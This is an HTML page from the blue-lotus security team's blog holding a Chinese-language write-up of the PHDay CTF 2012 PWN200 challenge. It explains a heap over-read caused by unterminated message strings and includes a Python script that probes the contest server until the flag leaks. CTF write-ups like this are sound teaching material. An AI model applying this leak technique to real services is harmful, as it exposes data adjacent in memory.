@@ -1,0 +1,324 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>PHDay CTF 2012 Quals PWN200 - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="这道题是一个远程的binary服务，提供了消息操作的接口，连上去会有如下提示： Welcome
+1 &#8211; save message
+2 &#8211; show message
+3 &#8211; append message
+4 &#8211; rewrite message
+5 &# &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/phday-ctf-2012-quals-pwn200">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">PHDay CTF 2012 Quals PWN200</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-17T00:00:00+08:00" pubdate data-updated="true">Dec 17<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>这道题是一个远程的binary服务，提供了消息操作的接口，连上去会有如下提示：</p>
+
+<!--more-->
+
+
+<p>Welcome<br/>
+1 &#8211; save message<br/>
+2 &#8211; show message<br/>
+3 &#8211; append message<br/>
+4 &#8211; rewrite message<br/>
+5 &#8211; delete message</p>
+
+<p>下载下来的binary文件名位heaptaskforbin，即可推断此题的利用点为heap。使用IDA反编译分析C代码，首先注意到客户端连接上以后，一个初始化的函数做了如下操作：</p>
+
+<ol>
+<li>随机在堆上存了n个随机的message，n也是100以内的随机数</li>
+<li>将flag文件读入堆中，指针不free也不引用</li>
+<li>随机free掉堆上在步骤1中已经分配的大约n/2个message</li>
+</ol>
+
+
+<p>这是将flag读入堆中的代码：</p>
+
+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/pwn200_flag_malloc.jpg" alt="pwn200_flag_malloc" /></p>
+
+<p>由于步骤3中free掉了很多堆上的空间，因此如果再次使用，很可能会紧挨着堆中flag的数据，因此思路是寻找堆上的内存覆盖。</p>
+
+<p>仔细分析服务提供的5个操作，重点关注save/append/rewrite这三个涉及写的函数，发现这些写的操作中都有个共同的问题：</p>
+
+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/pwn200_exploit.jpg" alt="pwn200_exploit" /></p>
+
+<p>上述代码中仅仅将输入的&#8221;\n&#8221;和&#8221;\r&#8221;换成&#8221;\0&#8243;，如果输入的字串中没有&#8221;\n&#8221;和&#8221;\r&#8221;，则堆里面写入的字符串将没有结尾符，可以利用这一点先写入无结尾符的message，如果正好跟堆中flag的位置相连，就能把字符串连带flag给show出来。</p>
+
+<p>利用这个思路，先往里save256个&#8221;A&#8221;，然后show这个字符串，比对这两者差异，如果相差较多，则很可能拿到的是flag，如果不够多，只差了几个字节，那么append一些&#8221;A&#8221;，将堆中的&#8221;\0&#8243;覆盖掉，进一步探测。</p>
+
+<pre><code>def save(buf):
+    s.send("1")
+    print s.recv(8192)
+    s.send(buf)
+    ret = s.recv(8192)
+    print ret
+    id_ = ret.strip().replace('\n', '').split()[-1]
+    return id_
+
+def append(id_, buf):
+    s.send("3")
+    print s.recv(8192)
+    s.send(str(id_))
+    print s.recv(8192)
+    s.send(buf)
+    print s.recv(8192)
+
+def show(id_):
+    s.send('2')
+    print s.recv(8192)
+    s.send(str(id_))
+    print s.recv(8192)
+    ret = s.recv(8192)
+    print ret
+    buf = ret[0:ret.find("\n")]
+    return buf
+
+s=socket.socket()
+s.connect(("ctf.phdays.com", 14455))
+
+print s.recv(8192)
+
+for i in range(20000):
+    slen = 256
+    buf = "A" * slen
+    id_ = save(buf)
+    ret = show(id_)
+
+    diff = len(ret) - len(buf) + 1
+    if diff &gt; 10:
+        print buf
+        print ret
+        break
+    else:
+        if diff &lt; 10:
+            diff = 10
+
+    while slen+diff &lt; 1024:
+        diff_buf = "A" * diff
+        buf += diff_buf
+        slen += diff
+        append(id_, diff_buf)
+        ret = show(id_)
+
+        diff = len(ret) - len(buf) + 1
+        diff_buf = "A" * diff
+
+        if diff &gt; 10:
+            print buf
+            print ret
+            break
+</code></pre>
+
+<p>写完这个自动探测的程序，我第一遍跑就拿到了flag：</p>
+
+<p><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/pwn200_flag.jpg" alt="pwn200_flag" /></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">kelwin</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-17T00:00:00+08:00" pubdate data-updated="true">Dec 17<span>th</span>, 2012</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/phday-ctf-2012-quals-pwn200/" data-via="" data-counturl="http://www.blue-lotus.net/www/phday-ctf-2012-quals-pwn200/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/phday-ctf-2012-quals-misc400/" title="Previous Post: PHDay CTF 2012 Quals Misc400">&laquo; PHDay CTF 2012 Quals Misc400</a>
+      
+      
+        <a class="basic-alignment right" href="/phday-ctf-2012-quals-pwn300/" title="Next Post: PHDay CTF 2012 Quals PWN300">PHDay CTF 2012 Quals PWN300 &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
